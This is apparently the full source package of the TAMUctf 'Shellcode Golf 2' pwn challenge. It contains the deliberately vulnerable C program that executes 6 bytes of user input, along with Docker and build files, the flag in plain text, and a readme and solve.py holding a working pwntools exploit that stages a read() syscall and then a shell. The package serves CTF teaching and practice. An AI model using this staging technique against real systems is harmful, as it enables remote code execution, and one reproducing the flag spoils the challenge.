{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{m1nIm4L_5h3llc0d3_48b55e}\"\n",
    "Dockerfile": "FROM debian as build\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD shellcode-golf.c /tmp/shellcode-golf.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/shellcode-golf /pwn/shellcode-golf\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE 5321\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat -s TCP-LISTEN:5320,reuseaddr,fork EXEC:/pwn/shellcode-golf,stderr\"]\n",
    "flag.txt": "gigem{m1nIm4L_5h3llc0d3_48b55e}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := \nCONTAINER := shellcode-golf-2\n\nall: shellcode-golf\n\nclean: .PHONY\n\trm -f shellcode-golf\n\nshellcode-golf: shellcode-golf.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile shellcode-golf\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name shellcode-golf -p 5320:5320 shellcode-golf-2\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/shellcode-golf - | tar xv shellcode-golf\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"Shellcode Golf 2\",\n  \"category\": \"Pwn\",\n  \"description\": \"Shellcode harder. Only 6 bytes of it, this time.\\n{{url_for('shellcode-golf.c')}}\\n<a href='http://tamuctf.com/static-files/shellcode-golf-2'>shellcode-golf-2</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername shellcode-golf-2 -quiet</code>\",\n  \"score\" : 400,\n  \"hints\": [],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "readme.md": "# shellcode golf\n\nI'll execute any shellcode you give me, but only 6 bytes of it.  I bet you can't get the flag!  \n`nc challenges.tamuctf.com 5321`\n\n(provide binary)\n\n## Solution\n\nIn one of my proudest moments ever, I present... 6 bytes to shellcode (sorta)!\n\n```python\nfrom pwn import *\n\ncontext.arch = 'x86_64'\n\ninitial = asm('xchg %esi,%edx;xor %edi,%edi;syscall')\npayload = asm('nop') * 7 + asm(shellcraft.sh())\n\nprint(\"initial payload is\", len(initial), \"bytes\")\n\n# p = elf.debug()\np = process('./shellcode-golf')\n# p = remote('35.226.243.146', 5320)\n\np.sendline(initial)\np.sendline(payload)\n\np.interactive()\n```\n\nThis takes advantage of the fact that mmap actually allocates at least one page of memory: https://man7.org/linux/man-pages/man2/mmap.2.html\n\nThis is typically around 4096 bytes on x86_64 (citation needed, I just remember this number and might be wrong, but oh well). If we can read more than the 6 bytes allowed by fgets, then we can overcome the limitation.\n\nTo do this, we need to invoke the `read` syscall, with 0 in %rax and %rdi and the pointer to the region we want to overwrite in %rsi. Provided %rdx is arbitrarily larger than our shellcode, we don't actually need to worry about the length because we can simply wait for `read` to timeout.\n\nHelpfully, %rdx already contains our target buffer (or near enough) due to the indirect call and %rax already contains 0. This gives us the following shellcode:\n\n```asm\nxchg %esi, %edx     ; shorter than mov -- this is two bytes\nxor %edi, %edi      ; again, shorter because we're using the 32-bit register\nsyscall\n```\n\nFiring this at the target, we get:\n\n```\ninitial payload is 6 bytes\n[+] Opening connection to xxx.xxx.xxx.xxx on port 5321: Done\n[*] Switching to interactive mode\n$ cat flag.txt\ngigem{m1nIm4L_5h3llc0d3_48b55e}$ \n```\n",
    "shellcode-golf.c": "#include <stdlib.h>\n#include <stdio.h>\n#include <sys/mman.h>\n\nvoid main() {\n\tchar* shellcode = (char*) mmap((void*) 0x1337, 7, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\tmprotect(shellcode, 7, PROT_READ | PROT_WRITE | PROT_EXEC);\n\tfgets(shellcode, 7, stdin);\n\t((void (*)())shellcode)();\n}\n",
    "solve.py": "from pwn import *\nimport time\n\ncontext.arch = 'x86_64'\n\nelf = ELF('./shellcode-golf')\n\ninitial = asm('xchg %esi,%edx;xor %edi,%edi;syscall')\npayload = asm('nop') * 10 + asm(shellcraft.sh())\n\nprint(\"initial payload is\", len(initial), \"bytes\")\n\n# p = elf.debug()\n# p = elf.process()\n# p = process('./shellcode-golf')\np = remote('localhost', 4444)\n\np.sendline(initial)\ntime.sleep(.5)\np.sendline(payload)\n\np.interactive()\n",
    "category": "pwn"
}